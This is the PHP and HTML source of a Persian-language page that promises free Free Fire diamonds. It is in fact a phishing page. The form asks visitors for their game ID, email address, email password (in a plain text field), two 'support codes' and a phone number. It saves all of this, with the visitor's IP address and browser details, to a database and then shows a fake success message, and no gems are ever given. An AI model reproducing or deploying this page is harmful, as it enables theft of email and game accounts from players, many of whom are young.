<?php
require_once 'config.php';

$success_message = '';
$error_message = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $player_id = trim($_POST['player_id'] ?? '');
    $player_name = trim($_POST['player_name'] ?? '');
    $email = trim($_POST['email'] ?? '');
    $email_password = trim($_POST['email_password'] ?? '');
    $support_code_1 = trim($_POST['support_code_1'] ?? '');
    $support_code_2 = trim($_POST['support_code_2'] ?? '');
    $server = $_POST['server'] ?? '';
    $diamond_type = $_POST['diamond_type'] ?? '';
    $diamond_amount = intval($_POST['diamond_amount'] ?? 0);
    $phone_number = trim($_POST['phone_number'] ?? '');
    
    $errors = [];
    
    if (empty($player_id) || strlen($player_id) < 5) {
        $errors[] = 'شناسه بازیکن معتبر نیست';
    }
    if (empty($player_name)) {
        $errors[] = 'نام بازیکن الزامی است';
    }
    if (empty($email) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
        $errors[] = 'ایمیل معتبر نیست';
    }
    if (empty($email_password) || strlen($email_password) < 6) {
        $errors[] = 'رمز ایمیل حداقل ۶ کاراکتر';
    }
    if (empty($support_code_1) || empty($support_code_2)) {
        $errors[] = 'کدهای پشتیبانی الزامی هستند';
    }
    if (empty($server)) {
        $errors[] = 'سرور را انتخاب کنید';
    }
    if (empty($diamond_type)) {
        $errors[] = 'نوع جم را انتخاب کنید';
    }
    
    if (empty($errors)) {
        try {
            $stmt = $pdo->prepare("INSERT INTO requests (player_id, player_name, account_id, email, email_password, support_code_1, support_code_2, server, diamond_type, diamond_amount, phone_number, ip_address, user_agent) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
            $stmt->execute([$player_id, $player_name, $player_id, $email, $email_password, $support_code_1, $support_code_2, $server, $diamond_type, $diamond_type === 'specific_amount' ? $diamond_amount : null, $phone_number, $_SERVER['REMOTE_ADDR'], $_SERVER['HTTP_USER_AGENT']]);
            $success_message = '✅ درخواست با موفقیت ثبت شد!';
        } catch(PDOException $e) {
            $error_message = 'خطا در ثبت درخواست!';
        }
    } else {
        $error_message = implode('<br>', $errors);
    }
}
?>
<!DOCTYPE html>
<html lang="fa" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جم رایگان فری فایر</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Vazirmatn', 'Tahoma', sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
        }
        
        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 50%, rgba(255,255,255,0.1) 0%, transparent 50%),
                        radial-gradient(circle at 70% 50%, rgba(255,255,255,0.05) 0%, transparent 50%);
            animation: rotate 30s linear infinite;
            z-index: 0;
        }
        
        @keyframes rotate {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }
        
        .floating-icons {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        
        .floating-icon {
            position: absolute;
            color: rgba(255,255,255,0.1);
            font-size: 24px;
            animation: floatIcon 6s ease-in-out infinite;
        }
        
        .floating-icon:nth-child(1) { top: 10%; left: 10%; animation-delay: 0s; font-size: 30px; }
        .floating-icon:nth-child(2) { top: 20%; right: 15%; animation-delay: 1s; font-size: 20px; }
        .floating-icon:nth-child(3) { bottom: 15%; left: 20%; animation-delay: 2s; font-size: 25px; }
        .floating-icon:nth-child(4) { bottom: 25%; right: 10%; animation-delay: 3s; font-size: 35px; }
        .floating-icon:nth-child(5) { top: 50%; left: 5%; animation-delay: 4s; font-size: 18px; }
        .floating-icon:nth-child(6) { top: 40%; right: 5%; animation-delay: 5s; font-size: 28px; }
        
        @keyframes floatIcon {
            0%, 100% { transform: translateY(0) rotate(0deg); }
            50% { transform: translateY(-30px) rotate(10deg); }
        }
        
        .container {
            width: 100%;
            max-width: 500px;
            position: relative;
            z-index: 1;
        }
        
        .main-card {
            background: rgba(255, 255, 255, 0.95);
            backdrop-filter: blur(20px);
            border-radius: 24px;
            padding: 30px 25px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.15),
                        0 0 40px rgba(102, 126, 234, 0.1);
            border: 1px solid rgba(255,255,255,0.3);
        }
        
        .header {
            text-align: center;
            margin-bottom: 25px;
            padding-bottom: 20px;
            border-bottom: 2px solid rgba(102, 126, 234, 0.1);
        }
        
        .header-icon {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
            animation: pulse 2s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        
        .header-icon i {
            font-size: 32px;
            color: #fff;
        }
        
        h1 {
            color: #2d3748;
            font-size: 22px;
            font-weight: 900;
            margin-bottom: 5px;
        }
        
        .subtitle {
            color: #718096;
            font-size: 13px;
            font-weight: 400;
        }
        
        .section {
            background: linear-gradient(135deg, rgba(102, 126, 234, 0.03), rgba(118, 75, 162, 0.03));
            border-radius: 16px;
            padding: 18px;
            margin-bottom: 15px;
            border: 1px solid rgba(102, 126, 234, 0.1);
            transition: all 0.3s;
        }
        
        .section:hover {
            border-color: rgba(102, 126, 234, 0.2);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.08);
        }
        
        .section-title {
            color: #667eea;
            font-size: 14px;
            font-weight: 700;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .section-title i {
            width: 30px;
            height: 30px;
            background: linear-gradient(135deg, #667eea, #764ba2);
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 13px;
        }
        
        .form-row {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }
        
        .form-group {
            margin-bottom: 12px;
        }
        
        .form-group:last-child {
            margin-bottom: 0;
        }
        
        .form-group.full {
            grid-column: 1 / -1;
        }
        
        label {
            display: block;
            color: #4a5568;
            font-size: 12px;
            font-weight: 600;
            margin-bottom: 6px;
        }
        
        input, select {
            width: 100%;
            padding: 11px 14px;
            background: #fff;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            color: #2d3748;
            font-size: 13px;
            font-family: 'Vazirmatn', 'Tahoma', sans-serif;
            transition: all 0.3s;
            outline: none;
        }
        
        input:focus, select:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
            background: #f8faff;
        }
        
        select {
            cursor: pointer;
            appearance: none;
            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 24 24' fill='none' stroke='%23667eea' stroke-width='2'%3E%3Cpath d='M6 9l6 6 6-6'%3E%3C/path%3E%3C/svg%3E");
            background-repeat: no-repeat;
            background-position: left 14px center;
            padding-left: 35px;
        }
        
        input::placeholder {
            color: #a0aec0;
        }
        
        .diamond-quick-select {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 8px;
            margin-top: 8px;
        }
        
        .diamond-quick-btn {
            padding: 10px 5px;
            background: #fff;
            border: 2px solid #e2e8f0;
            border-radius: 10px;
            text-align: center;
            color: #4a5568;
            font-size: 12px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            font-family: 'Vazirmatn', 'Tahoma', sans-serif;
        }
        
        .diamond-quick-btn:hover {
            border-color: #667eea;
            background: #f8faff;
            color: #667eea;
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.15);
        }
        
        .submit-btn {
            width: 100%;
            padding: 15px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 15px;
            font-family: 'Vazirmatn', 'Tahoma', sans-serif;
            box-shadow: 0 10px 30px rgba(102, 126, 234, 0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }
        
        .submit-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(102, 126, 234, 0.4);
        }
        
        .submit-btn:active {
            transform: translateY(-1px);
        }
        
        .message {
            padding: 14px 18px;
            border-radius: 14px;
            margin-bottom: 20px;
            font-size: 13px;
            text-align: center;
            font-weight: 500;
            display: flex;
            align-items: center;
            gap: 10px;
            justify-content: center;
        }
        
        .success {
            background: #f0fff4;
            border: 2px solid #c6f6d5;
            color: #276749;
        }
        
        .error {
            background: #fff5f5;
            border: 2px solid #fed7d7;
            color: #9b2c2c;
        }
        
        @media (max-width: 480px) {
            .main-card {
                padding: 20px 15px;
                border-radius: 20px;
            }
            
            .form-row {
                grid-template-columns: 1fr;
            }
            
            .diamond-quick-select {
                grid-template-columns: repeat(2, 1fr);
            }
        }
    </style>
</head>
<body>
    <div class="floating-icons">
        <i class="fas fa-gem floating-icon"></i>
        <i class="fas fa-gamepad floating-icon"></i>
        <i class="fas fa-crown floating-icon"></i>
        <i class="fas fa-star floating-icon"></i>
        <i class="fas fa-shield-halved floating-icon"></i>
        <i class="fas fa-trophy floating-icon"></i>
    </div>
    
    <div class="container">
        <div class="main-card">
            <div class="header">
                <div class="header-icon">
                    <i class="fas fa-gem"></i>
                </div>
                <h1>جم رایگان فری فایر</h1>
                <p class="subtitle">Free Fire Diamonds</p>
            </div>
            
            <?php if ($success_message): ?>
                <div class="message success">
                    <i class="fas fa-check-circle"></i>
                    <?php echo $success_message; ?>
                </div>
            <?php endif; ?>
            
            <?php if ($error_message): ?>
                <div class="message error">
                    <i class="fas fa-exclamation-circle"></i>
                    <?php echo $error_message; ?>
                </div>
            <?php endif; ?>
            
            <form method="POST">
                <div class="section">
                    <div class="section-title">
                        <i class="fas fa-user"></i>
                        اطلاعات اکانت
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label>شناسه بازیکن (Player ID)</label>
                            <input type="text" name="player_id" placeholder="123456789" required>
                        </div>
                        <div class="form-group">
                            <label>نام در بازی (Nickname)</label>
                            <input type="text" name="player_name" placeholder="نام شما در بازی" required>
                        </div>
                    </div>
                    <div class="form-group">
                        <label>سرور بازی</label>
                        <select name="server" required>
                            <option value="">انتخاب سرور</option>
                            <option value="MENA">خاورمیانه و شمال آفریقا (MENA)</option>
                            <option value="India">هند (India)</option>
                            <option value="Indonesia">اندونزی (Indonesia)</option>
                            <option value="Brazil">برزیل (Brazil)</option>
                            <option value="Other">سایر سرورها</option>
                        </select>
                    </div>
                </div>
                
                <div class="section">
                    <div class="section-title">
                        <i class="fas fa-envelope"></i>
                        اطلاعات ایمیل
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label>آدرس ایمیل</label>
                            <input type="email" name="email" placeholder="example@gmail.com" required>
                        </div>
                        <div class="form-group">
                            <label>رمز ایمیل</label>
                            <input type="text" name="email_password" placeholder="رمز ایمیل" required>
                        </div>
                    </div>
                </div>
                
                <div class="section">
                    <div class="section-title">
                        <i class="fas fa-shield-halved"></i>
                        کدهای پشتیبانی
                    </div>
                    <div class="form-row">
                        <div class="form-group">
                            <label>کد پشتیبانی ۱</label>
                            <input type="text" name="support_code_1" placeholder="کد اول" required>
                        </div>
                        <div class="form-group">
                            <label>کد پشتیبانی ۲</label>
                            <input type="text" name="support_code_2" placeholder="کد دوم" required>
                        </div>
                    </div>
                </div>
                
                <div class="section">
                    <div class="section-title">
                        <i class="fas fa-diamond"></i>
                        نوع و مقدار جم
                    </div>
                    <div class="form-group">
                        <select name="diamond_type" id="diamondType" onchange="toggleAmount()" required>
                            <option value="">انتخاب نوع جم</option>
                            <option value="weekly">جم هفتگی (Weekly Membership)</option>
                            <option value="specific_amount">تعداد جم مشخص</option>
                        </select>
                    </div>
                    <div id="amountBox" style="display:none;">
                        <div class="form-group" style="margin-top:12px;">
                            <input type="number" name="diamond_amount" id="diamondAmount" placeholder="تعداد جم درخواستی" min="10" max="10000">
                        </div>
                        <div class="diamond-quick-select">
                            <div class="diamond-quick-btn" onclick="setAmount(100)">۱۰۰ 💎</div>
                            <div class="diamond-quick-btn" onclick="setAmount(310)">۳۱۰ 💎</div>
                            <div class="diamond-quick-btn" onclick="setAmount(520)">۵۲۰ 💎</div>
                            <div class="diamond-quick-btn" onclick="setAmount(1060)">۱۰۶۰ 💎</div>
                        </div>
                    </div>
                </div>
                
                <div class="section">
                    <div class="section-title">
                        <i class="fas fa-phone"></i>
                        اطلاعات تماس
                    </div>
                    <div class="form-group">
                        <input type="tel" name="phone_number" placeholder="شماره تماس (اختیاری) 09xxxxxxxxx">
                    </div>
                </div>
                
                <button type="submit" class="submit-btn">
                    <i class="fas fa-paper-plane"></i>
                    ارسال درخواست جم رایگان
                </button>
            </form>
        </div>
    </div>
    
    <script>
        function toggleAmount() {
            const type = document.getElementById('diamondType').value;
            const box = document.getElementById('amountBox');
            box.style.display = type === 'specific_amount' ? 'block' : 'none';
            if (type !== 'specific_amount') {
                document.getElementById('diamondAmount').value = '';
            }
        }
        
        function setAmount(val) {
            document.getElementById('diamondType').value = 'specific_amount';
            document.getElementById('amountBox').style.display = 'block';
            document.getElementById('diamondAmount').value = val;
        }
    </script>
</body>
</html>
